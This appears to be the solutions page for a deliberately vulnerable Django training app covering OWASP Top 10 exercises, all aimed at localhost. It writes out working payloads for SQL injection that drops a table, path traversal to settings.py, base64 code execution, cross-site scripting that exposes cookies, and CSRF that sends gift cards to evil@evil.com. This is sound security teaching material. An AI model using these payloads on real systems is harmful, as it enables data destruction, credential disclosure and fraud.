# Exercise Solutions

Don't read this until you are ready for solutions (cheating is no fun, right?).


## A1: Injection - SQL Injection

Submit the form with:

    '; drop table users;--

The solution is available live in the app after you've tried it.


## A1 Injection - Malicious File Access

Start with

    http://localhost:8000/user-pic?p=hacker.jpg

Change the p= parameter to walk the file system:

    http://localhost:8000/user-pic?p=../../settings.py


## A1 Injection - Malicious Code Execution

Open a interactive Python session.

If you're using Python 3, execute:

    import base64
    base64.encodestring(b"open('p0wned.txt','w').write('boom!')")

If you're using Python 2, execute:

    import base64
    base64.encodestring("open('p0wned.txt','w').write('boom!')")

Copy and paste the value into the textbox:

    b3BlbigncDB3bmVkLnR4dCcsJ3cnKS53cml0ZSgnYm9vbSEnKQ==

The solution is available live in the app after you've tried it.


## A2: Broken Authentication & Session Management

No exercises for this section.


## A3: Cross Site Scripting - URL Path

Start with:

    http://localhost:8000/cross-site-scripting/path-matching/your-path-here

Craft some javascript that will close the string we're injecting into, change
the title, and absorb the remainder of the string that we're injecting into:

    ";document.title="PLZ%20HACK%20MY%20USERS";"

Then change the URL:

    http://localhost:8000/cross-site-scripting/path-matching/";document.title="PLZ%20HACK%20MY%20USERS";"

The solution is available live in the app after you've tried it.


## A3: Cross Site Scripting - Query Parameters

Start with the URL:

    http://localhost:8000/cross-site-scripting/query-params?qs=awesome

Create a replacement for the qs parameter using an interactive Python shell (or
your favorite way to urlencode data):

    from urllib.parse import quote
    s = '''";var i=document.createElement('img');''' +\
        '''i.src='http://test/image.jpg';''' +\
        '''i.setAttribute('display', 'none');''' +\
        '''document.body.appendChild(i);"'''
    quote(s)

For Python 2, change the first line of that to:

    from urllib import quote

The triple quoting is important here so that the single and double quotes
within the string are handled correctly.

Take the encoded value and use it as the qs parameter:

    http://localhost:8000/cross-site-scripting/query-params?qs=%22%3Bvar%20i%3Ddocument.createElement%28%27img%27%29%3Bi.src%3D%27http%3A//test/image.jpg%27%3Bdocument.body.appendChild%28i%29%3B%22

The solution is live in the app after you've tried it.


## A3: Cross Site Scripting - Form Field Injection

It used to be possible to submit values like:

    "><script>...</script><"

Or, to add attributes onto the input tag:

    " onclick="..." "

You might try something like this:

    http://localhost:8000/cross-site-scripting/form-field?qs=hello%22%3E%3Cscript%3Edocument.getElementById%28%27cookie%27%29.innerHTML%253Ddocument.cookie%253B%3C/script%3E%3Ca%20name%3D%22">/cross-site-scripting/form-field?qs=hello%22%3E%3Cscript%3Edocument.getElementById%28%27cookie%27%29.innerHTML%253Ddocument.cookie%253B%3C/script%3E%3Ca%20name%3D%22

Your input will actually end up in the raw markup delivered to the client, but
modern browsers are smart enough to block it and damage this content so that it
doesn't act on it in a harmful way.  So we usually end up skipping this one in
class, but it's a good idea to understand why.


## A4: Insecure Direct Object References

Start with the vulnerable user profile link:

    http://localhost:8000/direct-object-references/users/1

Change the URL:

    http://localhost:8000/direct-object-references/users/2

Now you're an admin and can take control of the account by changing the email
or password.


## A5: Security Misconfiguration

No exercises, just demos.

Having the toolbar enabled in production (even secretly) is bad because we can
find out about SQL queries, software versions, logging messages, etc. that can
be leveraged to further attack the site.

Debug enabled in production is bad as well as it will leak stack traces and
Django settings to the public when an exception is thrown.


## A6: Sensitive Data Exposure

No exercises for this because proxy tools that we would use to observe our
traffic won't see localhost/127.0.0.1 traffic.


## A7: Missing Function Level Access Control

Start with the URL:

    http://localhost:8000/missing-access-control/happy-page?action=happy

Change the action parameter:

    http://localhost:8000/missing-access-control/happy-page?action=admin


## A8: Cross Site Request Forgery - Via GET

Start by looking at the giftcard form to find the paramters the form will send:

    http://localhost:8000/csrf/gift-card

Build the malicious payload in an interactive Python shell:

    from urllib.parse import quote
    url = '/csrf/gift-card?email=evil@evil.com&amount=100'
    js = '''";var i=document.createElement('img');''' +\
        '''i.src=%r;''' +\
        '''i.setAttribute('display', 'none');''' +\
        '''document.body.appendChild(i);"'''
    quote(js % url)

For Python 2, change the first line of that to:

    from urllib import quote

Use the resulting value in the qs parameter:

    http://localhost:8000/csrf/image?qs=%20%20%20%20%20%22%3Bvar%20i%3Ddocument.createElement%28%27img%27%29%3B%20%20%20%20%20i.src%3D%27/csrf/gift-card%3Femail%3Devil%40evil.com%26amount%3D100%27%3B%20%20%20%20%20i.setAttribute%28%27display%27%2C%20%27none%27%29%3B%20%20%20%20%20document.body.appendChild%28i%29%3B%22

This solution is available live in the app after you've tried it with a
non-working qs paramter.


## A8: Cross Site Request Forgery - Third Party Site

In this exercise we're pretending to submit a form from an external location
that will be POSTed to our vulnerable site.

Open up badguys/templates/vulnerable/csrf/third_party.html in your
editor and find the "put your form here" comment.

Use the gift card form again for reference to field names:

    http://localhost:8000/csrf/gift-card

Craft a form and add it to the template:

    <form action="http://localhost:8000/csrf/gift-card" method="POST">
        <input type="hidden" name="email" value="evil@evil.com">
        <input type="hidden" name="amount" value="100">
        <input type="submit" value="View Photos">
    </form>

Save the template and reload the page in your browser, then submit the form.

Optionally garnish with innocent-looking kitten photos from Placekitten.com:

    <img src="http://placekitten.com/400/200">


## A9: Using Known Vulnerable Components

No exercises for this section.


## A10: Unvalidated Redirects and Forwards - External Redirects

Grab the redirection link from the exercise:

    http://localhost:8000/redirects-and-forwards/redirect?url=%2Fredirects-and-forwards%2Fredirects

Pick a favorite URL that you'd like to redirect to, such as:

    http://example.com

Encode it and use it as the url parameter:

    http://localhost:8000/redirects-and-forwards/redirect?url=http%3A%2F%2Fexample.com

Load that link in your browser.


## A10: Unvalidated Redirects and Forwards

This is effectively identical to the function level access control exercise
above.

Start with the URL:

    http://localhost:8000/redirects-and-forwards/forward?fwd=happy

Change the fwd parameter to be forwarded to somewhere you shouldn't be:

    http://localhost:8000/redirects-and-forwards/forward?fwd=admin

